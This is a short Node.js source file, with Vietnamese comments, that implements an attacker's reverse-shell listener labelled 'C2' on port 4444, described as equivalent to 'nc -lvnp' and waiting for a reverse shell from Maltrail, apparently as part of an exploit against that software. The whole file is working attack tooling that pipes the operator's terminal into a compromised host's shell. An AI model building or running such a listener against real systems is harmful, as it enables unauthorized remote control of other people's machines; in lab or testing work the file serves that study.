/**
 * Máy attacker: lắng nghe reverse shell (tương đương nc -lvnp PORT).
 * Chạy: npm run listen
 */
const net = require("net");

const PORT = Number(process.env.C2_PORT || 4444);

const server = net.createServer((socket) => {
  const remote = `${socket.remoteAddress}:${socket.remotePort}`;
  process.stdout.write(`\n[+] Kết nối từ ${remote}\n`);

  socket.pipe(process.stdout);
  process.stdin.pipe(socket);

  socket.on("close", () => {
    process.stdout.write("\n[!] Kết nối đóng.\n");
    process.exit(0);
  });

  socket.on("error", () => {});
});

server.listen(PORT, "0.0.0.0", () => {
  process.stderr.write(
    `[*] C2 lắng nghe trên 0.0.0.0:${PORT} (chờ reverse shell từ Maltrail)\n`
  );
});

server.on("error", (err) => {
  process.stderr.write(`[!] Lỗi: ${err.message}\n`);
  process.exit(1);
});
